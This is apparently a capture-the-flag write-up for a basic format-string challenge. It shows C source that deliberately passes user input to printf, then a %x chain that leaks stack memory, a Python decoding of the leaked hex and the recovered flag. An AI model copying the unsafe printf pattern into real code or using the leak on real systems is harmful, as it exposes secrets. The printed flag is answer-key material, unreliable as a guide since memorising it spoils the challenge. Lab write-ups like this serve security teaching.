<h1>ELF x86 - Format string bug basic 1</h1>
<h3>Description</h3>

```c
#include <stdio.h>
#include <unistd.h>
 
int main(int argc, char *argv[]){
        FILE *secret = fopen("/challenge/app-systeme/ch5/.passwd", "rt");
        char buffer[32];
        fgets(buffer, sizeof(buffer), secret);
        printf(argv[1]);
        fclose(secret);
        return 0;
}
```

<h3>Solution</h3>
<label>Format string basic, input param %x</label>

```console
app-systeme-ch5@challenge02:~$ ./ch5 %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
20.804b160.804853d.9.bffffcf5.b7e19679.bffffbc4.b7fc1000.b7fc1000.804b160.39617044.28293664.6d617045.bf000a64.804861b.2.bffffbc4.bffffbd0.6b54e000.bapp-systeme-ch5@challenge02:~$ 
```
<label>39617044.28293664.6d617045.bf000a64 merupakan printable character dengan \n dan null bytes diakhir</label>

```python3
print(bytes.fromhex('bf000a646d6170452829366439617044')[::-1])
b'Dpa9d6)(Epamd\n\x00\xbf'
```
<h3>Flag</h3>
<pre>
Dpa9d6)(Epamd
</pre>
